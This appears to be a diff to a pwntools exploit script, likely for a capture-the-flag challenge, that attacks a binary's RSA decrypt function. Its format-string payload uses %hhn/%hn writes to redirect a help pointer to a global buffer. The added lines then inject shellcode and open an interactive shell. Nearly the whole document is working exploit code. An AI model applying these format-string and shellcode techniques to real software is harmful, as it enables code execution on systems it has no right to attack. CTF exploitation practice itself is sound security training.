@@ -66,21 +66,23 @@ for i in range(4):
     p.recvuntil(b": ")
     p.sendline(key_pair[i])
 
-# 2.rsa_encrypt. g_pbuf=0x602560 >>> 0x60251a 0x60 | 0x602518 0x2560
+# 2.RSA_decrypt-FSB, set help -> g_pbuf.
+# g_pbuf=0x602560 >>> 0x60251a:0x60 | 0x602518:0x2560
 pay = "%{}c".format(0x60)
-pay += "%{}$hhn".format(79)      # base offset 76. 76 + len(pay) / 8
+pay += "%{}$hhn".format(79)      # base offset is 76. 76 + len(pay) / 8
 pay += "%{}c".format(0x2560-0x60)
 pay += "%{}$hn".format(80)
 pay += "A"*(8-len(pay) % 8)
 print(len(pay))
 plain = pay.encode() + p64(help_add_a) + p64(help_add_8)
 enc = rsa_encrypt(plain)
-# rsa_decrypt
 dec = rsa_decrypt(enc)
 
 print("plain: ", plain)
 print("enc: ", enc)
 print("dec: ", dec)
 
+# 3. Inject shellcode.
 rsa_encrypt(shellcode)
+p.sendline(b"4")
 p.interactive()
